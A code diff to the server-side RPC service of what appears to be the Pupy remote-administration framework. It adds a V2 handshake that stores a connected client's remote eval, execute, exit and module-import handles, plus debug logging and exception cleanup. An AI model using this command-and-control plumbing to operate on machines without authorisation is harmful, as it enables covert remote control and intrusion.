@@ -47,6 +47,7 @@ from pupylib.PupyCredentials import Credentials
 
 from network.lib.msgtypes import msgpack_exthook
 from network.lib.rpc import Service, timed, nowait
+from network.lib.convcompat import as_native_string
 
 from . import getLogger
 logger = getLogger('service')
@@ -69,22 +70,22 @@ class PupyService(Service):
         self.eval = None
         self.execute = None
         self.pupyimporter = None
+        self.pupyimporter_funcs = None
         self.infos = None
         self.get_infos = None
 
         self.protocol_version = None
         self.remote_version = (2, 7)
-        self.remote_arch = None
 
         self.events_receiver = None
+
+        self.remote_loaded_modules = None
+        self.remote_cached_modules = None
 
     def exposed_on_connect(self):
         if sys.version_info.major == 3:
             # Deprecated API
             self._conn.activate_3to2()
-            # raise NotImplementedError(
-            #   'Too old RPC version - python3 to python2 is not supported'
-            # )
 
         self._conn._config.update({
             'allow_safe_attrs': False,
@@ -114,6 +115,9 @@ class PupyService(Service):
             infos, *args
        ):
 
+        if __debug__:
+            logger.debug('Initialize legacy V1 connection.')
+
         if sys.version_info.major == 3:
             # Deprecated API
             self._conn.activate_3to2()
@@ -133,6 +137,61 @@ class PupyService(Service):
         self.pupyimporter = pupyimporter
         self.infos = umsgpack.loads(infos, ext_hook=msgpack_exthook)
         self.get_infos = lambda: self.infos
+
+        self.pupy_srv.add_client(self)
+
+    def exposed_initialize_v2(
+        self,
+        protocol_version, remote_version,
+        namespace, modules, builtin,
+        register_cleanup, unregister_cleanup,
+        remote_exit, remote_eval, remote_execute,
+        infos, loaded_modules, cached_modules,
+            pupyimporter, pupyimporter_funcs, *args):
+
+        if __debug__:
+            logger.debug(
+                'Initialize V2 connection. Remote proto: %s Python: %s',
+                protocol_version, remote_version
+            )
+
+        self.protocol_version = protocol_version
+        self.remote_version = remote_version
+
+        if sys.version_info.major == 3 and \
+                self.remote_version[0] == 2:
+
+            if __debug__:
+                logger.debug(
+                    'Enable python3 to python2 communication hacks'
+                )
+
+            self._conn.activate_3to2()
+
+        self.namespace = namespace
+        self.modules = modules
+        self.builtin = self.builtins = builtin
+        self.register_remote_cleanup = nowait(register_cleanup)
+        self.unregister_remote_cleanup = nowait(unregister_cleanup)
+        self.obtain_call = False
+        self.exit = timed(remote_exit, 1)
+        self.eval = remote_eval
+        self.execute = remote_execute
+        self.pupyimporter = pupyimporter
+        self.pupyimporter_funcs = {
+            as_native_string(func): ref
+            for func, ref in pupyimporter_funcs.items()
+        }
+        self.infos = infos
+        self.get_infos = lambda: self.infos
+
+        self.remote_loaded_modules = set(
+            as_native_string(module) for module in loaded_modules
+        )
+
+        self.remote_cached_modules = set(
+            as_native_string(module) for module in cached_modules
+        )
 
         self.pupy_srv.add_client(self)
 
@@ -160,6 +219,9 @@ class PupyService(Service):
 
     # Compatibility call
     def exposed_set_modules(self, modules):
+        if __debug__:
+            logger.debug('Initialize legacy V0 connection.')
+
         try:
             self.modules = modules
             self.builtin = modules.__builtin__
@@ -174,19 +236,19 @@ class PupyService(Service):
             try:
                 self.register_remote_cleanup = \
                     self._conn.root.register_cleanup
-            except:
+            except Exception:
                 self.register_remote_cleanup = None
 
             if self.register_remote_cleanup:
                 try:
                     self.unregister_remote_cleanup = \
                         self._conn.root.unregister_cleanup
-                except:
+                except Exception:
                     self.unregister_remote_cleanup = None
 
                 try:
                     self.obtain_call = self._conn.root.obtain_call
-                except:
+                except Exception:
                     pass
 
             self.exit = self._conn.root.exit
@@ -199,7 +261,7 @@ class PupyService(Service):
             logger.error(traceback.format_exc())
             try:
                 self._conn.close()
-            except:
+            except Exception:
                 pass
 
     def exposed_msgpack_dumps(self, js, compressed=False):
